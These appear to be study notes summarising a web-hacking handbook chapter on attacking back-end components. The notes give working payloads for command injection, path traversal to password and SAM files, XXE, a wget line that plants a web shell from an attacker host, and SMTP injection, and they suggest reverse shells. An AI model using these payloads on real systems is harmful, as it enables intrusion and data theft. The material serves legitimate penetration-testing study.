CHAPTER 10: ATTACKING BACK-END COMPONENTS:

## **Finding OS Command Injection Flaws**:
1. You can normally use the `ping` command as a means of triggering a time delay by causing the server to ping its loopbak interface for specific period. There are minor differences between how Windows and UNIX-based platforms handle command separators and the `ping` command. However, the following all-purpose test string should induce a 30-second time delay on either platform if no filtering is in place:
```
|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &
```
To maximize your chances of detecting a command injection flaw if the application is filtering certain command separators, you should also submit each of the following test strings to each targeted parameter in turn and monitor the time taken for the application to respond:
```
| ping -i 30 127.0.0.1 |
| ping -n 30 127.0.0.1 |
& ping -i 30 127.0.0.1 &
& ping -n 30 127.0.0.1 &
; ping 127.0.0.1 ;
%0a ping -i 30 127.0.0.1 %0a
` ping 127.0.0.1 `
```
2. If a time delay occurs, the application may be vulnerable to command injection. Repeat the test case several times to confirm that the delay was not the result of network latency or other anomalies. You can try changing the value of the -n or -i parameters and confirming that the delay experienced varies systematically with the value supplied.
3. Using whichever of the injection strings was found to be successful, try injecting a more interesting command (such as `ls` or `dir`). Determine whether you can retrieve the results of the command to your browser.
4. If you are unable to retrieve results directly, you have other options:
	- You can attempt to open an out-of-bound channel back to your computer. Try using TFTP to copy tools up to the server, using telnet or netcat to create a reverse shell back to your computer, and using the `mail` command to send command output via SMTP
	- You can redirect the results of your commands to a file within the web root, which you can then retrieve directly using your browser. For example:
	```
	dir > c:\inetpub\wwwroot\foo.txt
	```
5. When you have found a means of injecting commands and retrieving the results, you should determine your privilege level (by using `whoami` or directory). You may then seek to escalate privileges, gain backdoor access to sensitive application data, or attack other hosts reachable from the compromised server.
6. The `<` and `>` characters are used, respectively, to direct the contents of a file to the command's input and to direct the command's output to a file. If it is not possible to use the preceding techniques to inject an entirely separate command, you may still be able to read and write arbitrary file contents using the `<` and `>` characters.
7. Many operating system commands that applications invoke accept a number of command-line parameters, and you may be able to add further parameters simply by inserting a space followed by the relevant parameter. For example, a web-authoring application may contain a function in which the server retrieves a user-specifed URL and renders its contens in-browser for editing. If the application may contain a function in which the server retrieves a user-specifed URL and renders its contents in-browser for editing. If the application simply calls out to the `wget` program, you may be able to write aritrary file contents to the server's filesystem by appending th `-o` command-line parameter used by `wget`. For example:
```
url=http://wahh-attacker.com/%20-o%20c:\inetpub\wwwroot\scripts\cmdasp.asp
```
## **Finding Dynamic Execution Vulnerabilites**:
1. Any item of user-supplied data may be passed to a dynamic execution function. Some of the items most commonly used in this way are the names and values of cookie parameters and persistent data stored in user profiles as the result of previous actions.
2. Try submitting the following values in turn as each targeted parameter:
```
;echo%20111111
echo %20111111
response.write%20111111
:response.write%20111111
```
3. Review the application's responses. If the string `111111` is returned on its own (is not preceeded by the rest of the command string), the application is likely to be vulnerable to the injection of scripting commands.
4. If the string `111111` is not returned, look for any error messages that indicate that you input is being dynamically executed and that you may need to fine-tune your syntax to achieve injection of arbitrary commands.
5. If the application you are attacking uses PHP, you can use the test string `phpinfo()`,which returns the config details of the PHP environment if successful.
6. If the application appears to be vulnerable, verify this by injecting some commands that result in time delays, as described previously for OS command injection. For example:
```
system('ping%20127.0.0.1')
```
# Manipulating File Paths
## **Finding and Exploiting Path Traversal Vulnerabilites**
1. Review the information gathered during application mapping to identify the following:
	- Any instance where a request parameter appears to contain the name of a file or directory, such as `include=main.inc` or `template=/en/sidebar`
	- Any application functions whose implementation is likely to involve retrieval of data from a server filestystem (as opposed to a back-end database), such as the displaying of office documents or images.
2. During all testing you perform in relation to every other kind of vulnerability, look for error messages or other anomalous events that are of interest. Try to find any evidence of instances where user-supplied data is being passed to file APIs or as parameters to opering system commands.

If you have local access to the web application do the following:
1. Use a suitable tool to monitor all filesystem activity on the server. For example, the FileMon tool from SysInternals can be used on Windows, the `ltrace/strace` tools can be used on Linux, and the `truss` command can be used on Sun's Solaris
2. Test every page of the application by insering a single unique string( such as `traversaltest`) into each submitted parameter (including all cookies, query string fields, and `POST` data items). Target only one parameter at a times, and use the automated techniques described in Chapter 14 to speed up the process.
3. Set a filter in your filesystem monitoring tool to identify all filesystem events that contain your test string.
4. If any events are identified where your test string has been used as or incorporated into a file or directory name, test each instance (as described next) to determine whether it is vulnerable to path traversal attacks.
## **Detecting Path Traversal Vulnerabilities**:
1. Working on the assumption that the parameter you are targeting is being appended to a preset directory specified by the application, modify the parameter's value to insert an arbitrary subdirectory and a single traversal sequence. For example:
```
file=foo/file1.txt
```
try submitting this value:

```
file=foo/bar/../file1.txt
``` 
If the application's behavior is identical in the two cases, it may be vulnerable. You should proceed directly to attempting to access different files by traversing above the start directory.
	
2. If the application's behavior is different in the two cases, it may be blocking,stripping or sanitizing traversal sequences, resulting in an invalid file path. You should examine whether there are any ways to circumvent the application's validation filters (described in the next section).
- The reason why this test is effective, even if the subdirectory `"bar"` does not exist, is that most common filesystems perform canonicalization of the file path before attempting to retrieve it. The traversal sequence cancels out the invented directory, so the server does not check whether it is present.

3. If the application function you are attacking provides read access to a file, attempt to access a know world-readable file on the operating system in question. Submit one of the following values as the filename parameter you control:
```
../../../../../../../../../../../etc/passwd
../../../../../../../../../../../windows/win.ini
```
if you are lucky, your browser displays the contents of the file you have requested.
4. If the function you are attacking provides write access to a file, it may be more difficult to verify conclusively whether the application is vunerable. One test that is often effective is to attempt to write two files -- one that should be writable by any user, and one that shuold not be writable even by root or Administrator. For example, on Windows:
```
../../../../../writetest.txt
../../../../../windows/system32/config/sam
```
on UNIX-based platforms, files that root may not write are version-dependent, but attempting to overwrite a directory with a file should always fail, so you can try:
```
../../../../../../tmp/writetest.txt
../../../../../../tmp
```
For each pair tests, if the application's behavior is different in response to the first and second requests(for example, if the second returns an error message but the first does not), the application is probably vulnerable.
5. An alternative method for verifying a traversal flaw with write access is to try to write a new file within the web root of the web server and then attempt to retrieve this with a browser. However, this method may not work if you do not know the location of the web root directory or if the user context in which the file access occurs doesn't have permission to write there.
## **Circumventing Obstacles to Traversal Attacks**:
1. Always try path traversal sequences of traversal sequences using both forward slashes and backslashes. Many input fulters check for only one of these, when the filesystem might support both.
2. Try simple URL-encoded respresentations of traversal sequences using the following encodings. Be sure to encode every single slash and dot within your input:
```
Dot ==> %2e
Foward Slash ==> %2f
Backslash ==> %5c
```
3. Try using 16-bit encoding:
```
Dot ==> %u002e
Foward Slash ==> %u2215
Backslash ==> %2216
```
4. Try double URL encoding:
```
Dot ==> %252e
Foward Slash ==> %252f
Backslash ==> %255c
```
5. Try overlong UTF-8 Unicode encoding:
```
Dot ==> %c0%2e, %e0%40%ae, %c0ae, and so on
Foward Slash ==> %c0%af, %e0%80%af. %c0%2f, and so on
Bakcslash ==> %c0%5c, %c0%80%5c, and so on
```
You can use the illegal Unicode payload type within Burp Intruder to generate a huge number of alternate representations of any given character and submit this at the relevant place within your target parameter. These representation strictly violate the rules for Unicode representation but nevertheless are accepted by many implementation of Unicode decoders, particularly on Windows.
6. If the application is attempting to sanitize user input by removing traversal sequences and does not apply this filter recursively, it may be possible to bypass the filter by placing one sequence within another. For example:
```
.....//
.....\/
..../\
....\\
```
7. Some applications check whether the user-supplied filename ends in a particular file type or set of file types and reject attempts to access anything else. Sometimes this check can be subverted by placing a URL-encoded null byte at the end of your requested filename, followed by a file type that the application accepts. For example:
```
../../../../../boot.ini%00.jpg
```
The reason this attack sometimes succeeds is that the file type check is implemented using an API in a managed execution environment in which strings are permitted to contain null characters (such as `string.endsWith()` in java). However, when the file is acutally retrieved, the application ultimately uses an API in an unmanaged environment in which strings are null-terminated. Therefore, your filename is effectively truncated to your desired value.
8. Some applications attempt to control the file type being accessed by appending their own file-type suffix to the filename supplied by the user. In this situation, either of the preceding exploits may be effective for the same reasons.
9. Some applications check whether the user-supplied filename starts with a particular subdirectory of the start directory, or even a specific filename. This check can be bypassed like:
```
filestore/../../../../../../../etc/passwd
```
10. If none of the preceding attacks against input filters is successful individually, the application might be implementing multiple types of filters. Therefore, you need to combine several of these attacks simultaneously (both against traversal sequence filters and file type or directory filters). If possible, the best approach here is to try to break the problem into separate stages. For examaple, if the request for: `diagram1.jpg` is successful, but the request for `foo/../diagram1.jpg` fails, try all the possible traversal sequence bypasses until a variation on the second request is successful. If these successful traversal sequence bypasses don't enable you to access `/etc/passwd`, probe whether any file type filtering is implemented and can be bypassed py requesting ` diagram1.jpg%00.jpg`. 
Working entirely within the start directory defined by the application, try to probe to understand all the filters being implemented, and see whether each one can be bypassed individually with the techniques described.
11. Of course, if you have whitebox access to the application, your task is much easier, because you can systematically work through different types of input and verify conclusively what filename (if any) is actually reaching the filesystem.
## **Exploiting Traversal Vulnerabilites**:
You can exploit read access path traversal flaws to retrieve interesting files from the server that may contain directly useful information or that help you refine attacks agains other vulnerabilities. For example:
	- Password files for the operating system and application.
	- Sever and application config files to discover other vulnerabilites or fine-tune a different attack.
	- Include files that may contain database creds.
	- Data sources used by the application, such as MySQL database files or XML files.
	- The source code to server-executable pages to perform a code review in search of bugs (for example, `GetImage.aspx?file=GetImage.aspx`)
	- Application log files that may contain usernames and session tokens and the like.

If you find a path traversal vulnerability that grants write access, your main goal should be to exploit this to achieve arbitrary execution of commands on the server. Here are some ways to exploit this vulnerability:
	- Create scripts in users' startup folders
	- Modify files sucha `in.ftpd` to execute arbitrary commands when a user next connects
	- Write scripts to a web directory with execute permissions, and call them from your browser.
## **FINDING FILE INCLUSION VULNERABILITIES**:
To test for remote file inclusion flaws, follow these steps:
1. Submit in each targeted parameter a URL for a resource on a web server that you control, and determine whether any requests are received form the server hosting the target application.
2. If the first test fails, try submitting a URL containing a nonexistan IP address, and determine whether a timeout occurs while the server attempts to connect.
3. If the application is found to be vulnerable to RFI, construct a malicious script using the available APIs in the relevant language, as described for dynamic execution attacks.

To test for Local File Inclusion flaws follow these steps:
1. Submit the name of a known executable resource on the server, and determine whether any change occurs in the application's behavior.
2. Submit the name of a known static resource on the server, and determine whether its contents are copied into the app's response.
3. If the app is vulnerable to LFI, attempt to access any sensitive functionality or resources that you cannot reach directly via the web server.
4. Test to see if you can access files in other directories using the traversal techniques described previously.
## **INJECTING INTO XML INTERPRETERS**:
XXE:
```
POST /search.127/AjaxSearch.ashx HTTP /1.1
HOST: mdsec.net
Content-Type: text/xml; charset=UTF-8
Content-Length: 114
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file://windows/win.ini" > ]>
<Search><SearchTerm>&xxe;</SearchTerm></Search>
```
## **FINDING and EXPLOITING SOAP INJECTION:**
1. Submit a rogue XML closing tag such as `</foo>` in each parameter in turn. If no error occurs, your input is probably not being inserted ino a *SOAP* message, or it is being sanitized in some way.
2. If an error was received, submit instead a valid opening and closing tag pair, such as `<foo></foo>`. If this causes the error to disappear, the application may be vulnerable.
3. In some situations, data that is inserted into an XML-formatted message is subsequently read back from its XML form and returned to the user. If the item you are modifying is being returned in the application's responses, see whether any XML content you submit is returned in its identical form or has been normalized in some way. Submit the following two values in turn:
```
test<foo/>
test<foo></foo>
```
If you find that either item is returned at the other, or simply as `test`, you can be confident that your input is being inserted into an XML-based message.
If the HTTP request contains several parameters that may be being placed into a SOAP message, try inserting the opening comment character(`<!--`) into one parameter and the closing comment character (`!-->`) into another parameter. Then switch these around (because you have no way of knowing in which order the parameters appear). Doing so can have the effect of commenting out a portion of the server's SOAP message. This may cause a change in the app's logic or result in a different error condition that may divulge information.

# Injecting into Back-end HTTP Requests
## **Server-side HTTP REDIRECTION**:
1. Identify any request parameters that appear to contain hostnames, IP addresses, or full URLs.
2. For each parameter, modify its value to specify an alternative resource, similar to the one being requested, and see if that resource appears in the server's response.
3. Try specifying a URL targeting a server on the Internet that you control, and monitor that server for incoming connections from the app you are testing.
4. If no incoming connections are received, monitor the time taken for the application to respond. If there is a delay, the app's back-end requests may be timing out due to network restrictions on outbound connections.
5. If you are successful in using the functionality to connect to arbitrary URLs, try to perform the following attacks:
	- Determine whether the port number can be specified. For example, you might supply `http://mdattacker.net:22`
	- If successful, attempt to port-scan the internal network by using a tool such as Burp Intruder to connect to a range of IP addresses and ports in sequence. (see Chapter 4)
	- Attempt to connect to other services on the loopback address of the application server.
	- Attempt to load a web page that you control into the application's response to delive a cross-site scripting attack.
	
*HACK Steps*:
1. Target each request parameter in turn, and try to append a new injected parameter using various syntax:
```
%26foo%3dbar ==> URL-encoded &foo=bar
%3bfoo%3dbar ==> URL-encoded ;foo=bar
%2526foo%253dbar ==> Double URL-encoded %foo=bar
```
2. Identify any instances where the app behaves as if the original parameter was unmodified. (This applies only to parameters that usually cause some difference in the application's response when modified).
3. Each instance identified in the previous step has a chance of parameter injection. Attempt to inject a known parameter at various points in the request to see if it can override or modify an existing parameter. For example:
```
FromAccount=18281008%27Amount%3d4444&Amount=1430&ToAccount=08447656
```
4. If this causes the new value to override the existing one, determine whether you can bypass any front-end validation by injecting a value that is read by a back-end server.
5. Replace the injected known parameter with additional parameter names as described for application mapping and content discovery in Chapter 4
6. Test the app's tolerance of multiple submissions of the same parameter within a request. Submit redundant values before and after other parameters, and at different locations within the request (within the query string, cookies, and the message body)

# INJECTING INTO MAIL SERVICES
## **FINDING SMTP INJECTION FLAWS**:
1. You should submit each of the following test strings as each parameter in turn. Inserting your own e-mail address at the relevant position:
```
<youremail>%0aCc:<youremail>

<youremail>%0d%0aCcL:<youremail>

<youremail>%0aBcc:<youremail>

<youremail>%0d%0aBcc:<youremail>

%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<youremail>%0aRCPT+TO:+<youremail>%0aDATA%0aFROM:+<youremail>%aTo:+<youremail>%0aSubject:+test%0afoo%0a%2e%0a

%0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+<youremail>%0d%0aRCPT+TO:+<youremail>%0d%0aDATA%0d%0aFrom:+<youremail>%0d%0aTo:+<youremail>%0d%0aSubject:+test%0d%0afoo%0d%0a%2e%0d%0a
```
2. Note any error messages the app returns. If these appear to relate to any problem in the e-mail function, investigate whether you need to fine-tune your input to exploit a vulnerability.
3. The application's responses may not indicate in any way whether a vulnerability exists or was successfully exploited. You should monitor the e-mail address you specified to see if any mail is received.
4. Review the HTML form that generates the relevant request. This may contain clues about the server-side software being used. It may also contain a hidden or disabled field that specifies the e-mail's To address, which you can modify directly.





























